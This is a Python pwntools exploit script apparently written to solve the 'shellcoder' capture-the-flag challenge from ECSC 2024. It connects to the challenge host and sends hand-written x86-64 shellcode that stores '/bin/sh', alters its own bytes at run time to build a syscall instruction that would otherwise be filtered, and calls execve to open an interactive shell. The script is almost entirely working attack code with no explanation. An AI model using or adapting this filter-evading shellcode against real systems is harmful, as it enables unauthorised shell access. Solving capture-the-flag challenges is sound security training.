#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=shellcoder.challs.external.open.ecsc2024.it' '--port=38201' build/shellcoder
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'build/shellcoder')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'shellcoder.challs.external.open.ecsc2024.it'
port = int(args.PORT or 38201)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

payload = asm('''
    mov rax, 0xbeef0016
    jmp rax
''')
payload += b"/bin/sh\x00\x0e\x05"
payload += asm('''
    mov rdi, 0xbeef000c
    xor rsi, rsi
    xor rdx, rdx
    mov r8, 0xbeef0014
    mov r9, [r8]
    inc r9
    mov [r8], r9b
    mov rax, 0x3b
    jmp r8
''')

io.sendlineafter(b"How many bytes?", str(len(payload)).encode())
io.sendlineafter(b"Shellcode:", payload)

io.interactive()

